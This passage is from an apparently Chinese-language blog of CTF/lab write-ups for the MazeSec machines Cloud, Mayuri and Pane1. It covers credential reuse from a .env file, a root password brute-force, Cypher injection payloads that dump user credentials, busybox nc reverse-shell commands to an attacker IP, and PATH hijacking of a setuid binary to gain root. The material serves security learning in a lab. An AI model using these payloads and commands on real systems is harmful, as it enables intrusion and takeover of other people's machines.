<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/data/safeline$ <span class="built_in">ls</span> -liah</span><br><span class="line"><span class="built_in">ls</span> -liah</span><br><span class="line">total 28K</span><br><span class="line">1438978 drwxr-xr-x  4 root root 4.0K Aug 12 02:09 .</span><br><span class="line">1438977 drwxr-xr-x  3 root root 4.0K Aug 12 02:08 ..</span><br><span class="line">1438993 -rw-r--r--  1 root root  222 Aug 12 02:09 .<span class="built_in">env</span></span><br><span class="line">1438992 -rw-r--r--  1 root root 4.5K Aug 12 02:08 docker-compose.yaml</span><br><span class="line">1438983 drwxr-xr-x  4 root root 4.0K Aug 12 02:08 logs</span><br><span class="line">1438979 drwxr-xr-x 10 root root 4.0K Aug 12 02:08 resources</span><br><span class="line">www-data@Cloud:/data/safeline$</span><br></pre></td></tr></table></figure>

<p>有个 <code>.env</code> ，查看一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/data/safeline$ <span class="built_in">cat</span> .<span class="built_in">env</span></span><br><span class="line"><span class="built_in">cat</span> .<span class="built_in">env</span></span><br><span class="line">SAFELINE_DIR=/data/safeline</span><br><span class="line">POSTGRES_PASSWORD=vivrdIDj6fhNJIRdnitL</span><br><span class="line">MGT_PORT=9443</span><br><span class="line">RELEASE=</span><br><span class="line">CHANNEL=</span><br><span class="line">REGION=</span><br><span class="line">IMAGE_PREFIX=swr.cn-east-3.myhuaweicloud.com/chaitin-safeline</span><br><span class="line">IMAGE_TAG=9.2.1</span><br><span class="line">SUBNET_PREFIX=192.168.0</span><br><span class="line">ARCH_SUFFIX=</span><br><span class="line">www-data@Cloud:/data/safeline$</span><br></pre></td></tr></table></figure>

<p>果然有个 <strong>POSTGRES_PASSWORD</strong> ，可能就是 lucky 用户的密码，尝试登录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/data/safeline$ su lucky </span><br><span class="line">su lucky </span><br><span class="line">Password: vivrdIDj6fhNJIRdnitL</span><br><span class="line"></span><br><span class="line">lucky@Cloud:/data/safeline$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">lucky</span><br><span class="line">lucky@Cloud:/data/safeline$</span><br></pre></td></tr></table></figure>

<p>切换到了 lucky 用户，现在可以去看刚才的 <code>.hint</code> 了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucky@Cloud:~$ <span class="built_in">ls</span> -liah</span><br><span class="line"><span class="built_in">ls</span> -liah</span><br><span class="line">total 28K</span><br><span class="line">527366 drwxr-xr-x 2 lucky lucky 4.0K Aug 12 06:04 .</span><br><span class="line">523265 drwxr-xr-x 3 root  root  4.0K Aug 12 03:38 ..</span><br><span class="line">527367 -rw-r--r-- 1 lucky lucky  220 Aug 12 03:38 .bash_logout</span><br><span class="line">527368 -rw-r--r-- 1 lucky lucky 3.5K Aug 12 03:38 .bashrc</span><br><span class="line">530672 -rw------- 1 lucky lucky   45 Aug 12 06:04 .hint</span><br><span class="line">527369 -rw-r--r-- 1 lucky lucky  807 Aug 12 03:38 .profile</span><br><span class="line">530667 -rw-r--r-- 1 root  root    44 Aug 12 03:38 user.txt</span><br><span class="line">lucky@Cloud:~$ <span class="built_in">cat</span> .hint</span><br><span class="line"><span class="built_in">cat</span> .hint</span><br><span class="line">root password length is 4.</span><br><span class="line">Regex is : <span class="string">&#x27;r..o&#x27;</span></span><br><span class="line">lucky@Cloud:~$ </span><br></pre></td></tr></table></figure>

<p>他是 <code>root</code> 的密码是 4 个字符，并且形式是 <code>r..o</code> ，可能中间是小写字母或者数字之类的，那就先用这个规则生成一个字典，如果不够，再生成加上大写字母和符号的字典就好了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import itertools,string; print(&#x27;\n&#x27;.join([&#x27;r&#x27;+a+b+&#x27;o&#x27; for a,b in itertools.product(string.ascii_lowercase+string.digits, repeat=2)]))&quot;</span> &gt; dict.txt</span><br></pre></td></tr></table></figure>

<p>然后，我们需要传入 <code>suForce</code> 这个本地爆破 ssh 登录的工具来爆破 root 的密码。</p>
<p>suForce 的使用有一点可以注意一下，可以自己手动改一改源脚本里的 <code>timeout</code> 的值，默认为 0.1 ，但我没改，跑了两次都没出，最后改成 0.5 就成功了。</p>
<p>suForce 的下载地址为 <a href="https://github.com/d4t4s3c/suForce">(https://github.com/d4t4s3c/suForce)</a></p>
<p>下载到宿主机之后，可以用 nc 来传入到靶机，也可以用 python3 开个 http.server ，再在靶机里面用 wget 传入。</p>
<p>传入到靶机之后，用如下的命令进行 root 密码的爆破：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucky@Cloud:~$ ./suForce -u root -w dict.txt </span><br><span class="line">            _____                        </span><br><span class="line"> ___ _   _ |  ___|__  _ __ ___ ___   </span><br><span class="line">/ __| | | || |_ / _ \| <span class="string">&#x27;__/ __/ _ \ </span></span><br><span class="line"><span class="string">\__ \ |_| ||  _| (_) | | | (_|  __/  </span></span><br><span class="line"><span class="string">|___/\__,_||_|  \___/|_|  \___\___|  </span></span><br><span class="line"><span class="string">-=================================-                                   </span></span><br><span class="line"><span class="string">[*] Username: root</span></span><br><span class="line"><span class="string">[*] Wordlist: dict.txt</span></span><br><span class="line"><span class="string">[i] Status</span></span><br><span class="line"><span class="string">    519/1296/40%/rooo                              </span></span><br><span class="line"><span class="string">[+] Password: rooo Line: 519</span></span><br><span class="line"><span class="string">-=================================-</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lucky@Cloud:~$</span></span><br></pre></td></tr></table></figure>

<p>爆破出 root 的密码为： <code>rooo</code> ，登录，拿 root flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucky@Cloud:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@Cloud:/home/lucky# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@Cloud:/home/lucky# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;root-74cc1c60799e0a786ac7094b532f01b1&#125;</span><br><span class="line">root@Cloud:/home/lucky#</span><br></pre></td></tr></table></figure>

<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>在 <strong>web 渗透</strong> 阶段，我由于第一次靶机开机好像有点问题，然后就重开了一次，偶然间发现，靶机重开之后的大概半分钟内，雷池 WAF 是还没有接管 80 端口的，因此 80 端口此时还能正常访问到。</p>
<p>因此，如果我们提前把命令执行的 <code>cutl</code> 内容给写好，就可以在靶机开启之后的短暂时间内绕过 WAF 的防护，直接进行反弹 shell 了。</p>
<p>大概就是，重开靶机，然后进行 curl 访问：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ curl <span class="string">&#x27;http://cloud.dsz/system.php?action=custom&amp;command=busybox+nc+192.168.43.68+1234+-e+%2Fbin%2Fbash&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后也是可以接收到反弹 shell 的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.43.154 34810</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>这可能是因为雷池 WAF 的部署是个 docker，靶机开机之后，docker 成功启动还需要一定的时间，但是 80 端口的 web 服务已经启动了，因此我们可以直接访问到 80 端口。</p>
]]></content>
      <tags>
        <tag>Maze-Sec</tag>
      </tags>
  </entry>
  <entry>
    <title>MazeSec-Mayuri</title>
    <url>/2025/08/12/MazeSec-Mayuri/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/mayuri]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- 192.168.0.103                                                                                                            </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 13:07 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.103</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 4A:94:24:32:EC:CF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.38 seconds</span><br></pre></td></tr></table></figure>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>开了80端口和8080端口，先访问一下80端口：</p>
<p><img src="image1.png" alt="image1"></p>
<p>说是要输入查询编号查询什么东西，看到“查询”两个字就想到可能会有注入，那就先来个引号试一下：</p>
<p><img src="image2.png" alt="image2"></p>
<p>果然报错了，但是报错的内容有点奇怪，有些问号，把这玩意扔给GPT问一下。</p>
<p>GPT说这看起来像是 <strong>Neo4j Cypher</strong> 查询语句，正常的形式可能是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;MATCH (n:shop) WHERE n.sid = &#x27; + sid + &#x27; RETURN n;&#x27;</span><br></pre></td></tr></table></figure>

<p>这个报错看上去sid是直接拼接在查询语句中的，sid我们可控，因此可能存在注入。</p>
<p>先看看8080端口是什么：</p>
<p><img src="image5.png" alt="image5"></p>
<p>8080端口是个登录页面，那可能就是要从80端口注入拿到账号密码，然后从8080端口进行登录。</p>
<p>回到80端口，学习一下cypher的基本语法，并且发现cypher的注释符号是 <strong>&#x2F;&#x2F;</strong> ，那就可以用 “1 return n;&#x2F;&#x2F;” 和 “1’ return n;&#x2F;&#x2F;” 来试试是否存在注入：</p>
<p><img src="image3.png" alt="image3"></p>
<p><img src="image4.png" alt="image4"></p>
<p>可以看到，<strong>1 return n;&#x2F;&#x2F;</strong> 可以正常返回查询sid为1的数据，说明存在数值类的注入。</p>
<p>根据这篇文章<a href="https://blog.csdn.net/Che_ng/article/details/145965471">(https://blog.csdn.net/Che_ng&#x2F;article&#x2F;details&#x2F;145965471)</a>学习了一下cypher的语法，构造出了如下的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 return 1 as n union call db.labels() yield label as n return n;//</span><br></pre></td></tr></table></figure>

<p>这个payload可以查询存在的所有标签，查看结果：</p>
<p><img src="image6.png" alt="image6"></p>
<p>发现有 <strong>User</strong> ，那就 <em>union</em> 继续拼接查询User的内容，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 return n union match(n:User) return n;//</span><br></pre></td></tr></table></figure>

<p><img src="image7.png" alt="image7"></p>
<p>看到 <em>username</em> 为 <code>Okabe</code> , <em>password</em> 为 <code>OOOkkkaaabbbeee</code> ，拿去8080端口登录：</p>
<p><img src="image8.png" alt="image8"></p>
<p>进去之后有个终端，尝试 <code>ls</code> :</p>
<p><img src="image9.png" alt="image9"></p>
<p>是个可以执行命令的终端，那就进行反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">busybox nc 192.168.0.104 1234 -e /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/mayuri]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.0.102 48486</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www-data@Mayuri:/var/www/website-b$ </span><br></pre></td></tr></table></figure>

<p>在home里面，有个kyoma用户：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ww-data@Mayuri:/var/www/website-b$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">www-data@Mayuri:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">kyoma</span><br><span class="line">www-data@Mayuri:/home$</span><br></pre></td></tr></table></figure>

<p>能够进入kyoma的家目录，不能执行 <code>ls</code> ，但是可以看user flag:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Mayuri:/home$ <span class="built_in">cd</span> kyoma</span><br><span class="line"><span class="built_in">cd</span> kyoma</span><br><span class="line">www-data@Mayuri:/home/kyoma$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span>: cannot open directory <span class="string">&#x27;.&#x27;</span>: Permission denied</span><br><span class="line">www-data@Mayuri:/home/kyoma$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">flag&#123;1.055821%&#125;</span><br><span class="line">www-data@Mayuri:/home/kyoma$ </span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在机器里面寻找一些信息，在环境变量里面发现了一个密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Mayuri:/home/kyoma$ <span class="built_in">env</span></span><br><span class="line"><span class="built_in">env</span></span><br><span class="line">Pass=1.129848</span><br><span class="line">PWD=/home/kyoma</span><br><span class="line">APACHE_LOG_DIR=/var/log/apache2</span><br><span class="line">LANG=C</span><br><span class="line">INVOCATION_ID=0e54d57f5e424abfa9aecdf373228dd1</span><br><span class="line">APACHE_PID_FILE=/var/run/apache2/apache2.pid</span><br><span class="line">APACHE_RUN_GROUP=www-data</span><br><span class="line">APACHE_LOCK_DIR=/var/lock/apache2</span><br><span class="line">SHLVL=2</span><br><span class="line">LC_CTYPE=C.UTF-8</span><br><span class="line">APACHE_RUN_DIR=/var/run/apache2</span><br><span class="line">JOURNAL_STREAM=9:13641</span><br><span class="line">APACHE_RUN_USER=www-data</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">OLDPWD=/home</span><br><span class="line">www-data@Mayuri:/home/kyoma$</span><br></pre></td></tr></table></figure>

<p>猜测是kyoma的密码，登录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Mayuri:/home/kyoma$ su kyoma</span><br><span class="line">su kyoma</span><br><span class="line">Password: 1.129848</span><br><span class="line"></span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">kyoma</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>在kyoma的家目录里面有一些文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">a.out  Mail  TimeMachine  user.txt</span><br><span class="line">kyoma@Mayuri:~$</span><br></pre></td></tr></table></figure>

<p>有个Mail，查看内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From: Okabe Rintarou &lt;phoenix.h@futuregadgetlab.net&gt;</span><br><span class="line">To: Okabe Rintarou &lt;o.rintarou@futuregadgetlab.net&gt;</span><br><span class="line">Subject: A Message to My Past Self</span><br><span class="line">Date: Mon, 15 Jul 2036 14:30:00 +0900</span><br><span class="line">Message-ID: &lt;f74c7678f9e61287e0719e59d9a10369@d-rine.sern.net&gt;</span><br><span class="line">X-Mailer: D-RINE (Amadeus Custom Build) v2.10</span><br><span class="line">X-Received-At: 2011-08-21 18:45:00 JST</span><br><span class="line"></span><br><span class="line">“看着吧，过去的我。”</span><br><span class="line">“世界是可以被欺骗的。”</span><br><span class="line">“将所有的可能性连接起来。”</span><br><span class="line">“欺骗世界，欺骗所有的时间轴观测者。”</span><br><span class="line">“这才是‘掌管未来的女神行动’。”</span><br><span class="line">“在那前方，有你的…”</span><br><span class="line">“你不是一个人。”</span><br><span class="line">“凤凰院凶真欺骗了世界。你也能做到。”</span><br><span class="line">“首先，你先需要通过时间机器拿到权限。”</span><br><span class="line">“El. Psy. Kongroo.”</span><br></pre></td></tr></table></figure>

<p>他说 <strong>“你先需要通过时间机器拿到权限”</strong> ，我们现在是kyoba，那要拿的权限就应该是root权限了。</p>
<p>说的时间机器应该就是家目录里的 <strong>TimeMachine</strong>，该文件信息如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ file TimeMachine</span><br><span class="line">file TimeMachine</span><br><span class="line">TimeMachine: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e7dd04e54e42aa78b9d552e1822b91d8c29f7004, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span> -liah TimeMachine</span><br><span class="line"><span class="built_in">ls</span> -liah TimeMachine</span><br><span class="line">527418 -rwsr-xr-x 1 root root 17K Aug  6 07:35 TimeMachine</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>是ELF文件，有suid权限，而且我们有读和执行权限，把文件拿出来，放到IDA里面查看：</p>
<p><img src="image10.png" alt="image10"></p>
<p>其中的 <em>execute_chronos_query</em> 函数内容如下：</p>
<p><img src="image11.png" alt="image11"></p>
<p>看到它用 system 函数执行了 <em>dest</em> 这个字符串变量，<em>dest</em> 里面又是包含 <code>timedatectl | grep &#39;Local time&#39; | awk -F&#39;: &#39; &#39;</code> 这个命令，其中的 <code>timedatectl</code> 没有使用绝对路径，且程序里面没有初始化 <strong>PATH</strong> 环境变量，因此我们可以尝试进行命令劫持。</p>
<p>在家目录下创建一个 <code>timedatectl</code> 文件，里面包含我们想要的提权命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;timedatectl</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;timedatectl</span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">chmod</span> +x timedatectl</span><br><span class="line"><span class="built_in">chmod</span> +x timedatectl</span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">a.out  Mail  timedatectl  TimeMachine  user.txt</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>修改 <strong>PATH</strong> :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">export</span> PATH=/home/kyoma:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/home/kyoma:<span class="variable">$PATH</span></span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/kyoma:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">kyoma@Mayuri:~$</span><br></pre></td></tr></table></figure>

<p>这时候如果运行TimeMachine，它使用的 <strong>timedatectl</strong> 命令应该就是我们放在家目录的那一个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ ./TimeMachine</span><br><span class="line">./TimeMachine</span><br><span class="line">==================================================</span><br><span class="line">=   世界线观测仪 v3.14 - AMADEUS 系统   =</span><br><span class="line">=      版权所有 2011, 未来道具研究所         =</span><br><span class="line">==================================================</span><br><span class="line"></span><br><span class="line">[系统] 初始化... 正在访问时序子系统。</span><br><span class="line">[自检] 验证命运石之眼校准... 正常。</span><br><span class="line">[自检] SERN 网络接口... 已激活。监视中...</span><br><span class="line"></span><br><span class="line">[警告] 时间跳跃机使用前需要充能。</span><br><span class="line">电话微波炉(暂定)充能中 [###################################] 100% (距离充能完毕:    0ms)</span><br><span class="line"></span><br><span class="line">[成功] 充能完毕。系统准备就绪。</span><br><span class="line"></span><br><span class="line">[成功] 正在向 IBN 5100 传输时序查询...</span><br><span class="line">--------------------------------------------------</span><br><span class="line">--------------------------------------------------</span><br><span class="line"></span><br><span class="line">操作完成。这一切都是命运石之门的选择。</span><br><span class="line">El. Psy. Kongroo.</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>查看 <strong>&#x2F;bin&#x2F;bash</strong> 的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span> -liah /bin/bash</span><br><span class="line"><span class="built_in">ls</span> -liah /bin/bash</span><br><span class="line">263242 -rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>可以看到已经有了s权限，用 <code>/bin/bash -p</code> 提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ /bin/bash -p</span><br><span class="line">/bin/bash -p</span><br><span class="line">bash-5.0# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0# </span><br></pre></td></tr></table></figure>

<p>root flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.0# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;1.123581%&#125;</span><br><span class="line">bash-5.0# </span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Maze-Sec</tag>
        <tag>cypher</tag>
      </tags>
  </entry>
  <entry>
    <title>MazeSec-Pane1</title>
    <url>/2025/08/13/MazeSec-Pane1/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- 192.168.0.106 -oA ports</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-13 09:55 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.106</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">38415/tcp open  unknown</span><br><span class="line">MAC Address: 66:14:A6:1C:F8:E8 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.92 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sT -sC -sV -O -p22,80,38415 192.168.0.106 -oA details</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-13 09:57 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.106</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)</span><br><span class="line">|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)</span><br><span class="line">|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.62 ((Debian))</span><br><span class="line">|_http-title: \xE8\xBF\x90\xE7\xBB\xB4\xE7\xAE\xA1\xE7\x90\x86\xE9\x9D\xA2\xE6\x9D\xBF</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="line">38415/tcp open  http    Golang net/http server</span><br><span class="line">|_http-title: \xE6\x9A\x82\xE6\x97\xB6\xE6\x97\xA0\xE6\xB3\x95\xE8\xAE\xBF\xE9\x97\xAE</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest, HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Set-Cookie: panel_public_key=LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE1ZllUUXFaT05WV3h5YlpqSndZbwp4Y1VuYnkyVUFZVVg4K0tBZmpna1liTVN2SU5ma1N4a3ZPMGIvNURud0F4UG9lYUZMTHNCTHhpOG9rVmdwRkQ4CjQ1U3R1Mmlqa1lXRVBXM29jWnEwVDMxODcremk0aTBxYlpvZU9pRWVzRUNCQksxTHhSeGowV1E4bnZSMTRnbk8KYktmRzEwL01xR040Nk9TL09XU0RkeXZxWXA0OGttRElaVlQxMCsxWGNzNXBEMnltUUxsWUl0L0VEQVEyQ0wwRQpzR1BKOUoreHJsSGVQMnl1cTgrQ2hlNmFWWWhmOE5oYmZzdVRQTW9TLy9DQVZTN0ZISmw5ZDA2aE5zbXhDV2pOCmJrL01VYnVMWUlmZk9jTWxmaW90eWNqL1VmNDJTQWZCVWZHTG5Na2ZKcVprbmhsV3V3Q2NINUVJZ29wMWl6T1YKelFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg%3D%3D; Path=/; Max-Age=604800</span><br><span class="line">|     Date: Wed, 13 Aug 2025 01:57:26 GMT</span><br><span class="line">|     Content-Length: 1410</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">|_    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-w</span></span><br><span class="line"><span class="string">MAC Address: 66:14:A6:1C:F8:E8 (Unknown)</span></span><br><span class="line"><span class="string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span></span><br><span class="line"><span class="string">Device type: general purpose|router</span></span><br><span class="line"><span class="string">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span></span><br><span class="line"><span class="string">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 29.89 seconds</span></span><br></pre></td></tr></table></figure>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>80 端口和 38415 看上去都是web，而且 38415 端口有一个比较有特征的 <strong>panel_public_key</strong>，搜了一下 <strong>panel</strong>，发现有关的为 <strong>1panel</strong> 这个运维面板，可能后面会有用。</p>
<p>先看看 80 端口：</p>
<p><img src="image1.png" alt="image1"></p>
<p>是个登录的页面，试了几个弱密码，都无法登录。</p>
<p>那就进行目录扫描：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ <span class="built_in">sudo</span> gobuster <span class="built_in">dir</span>  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://192.168.0.106 -x php,html,txt  </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.0.106</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   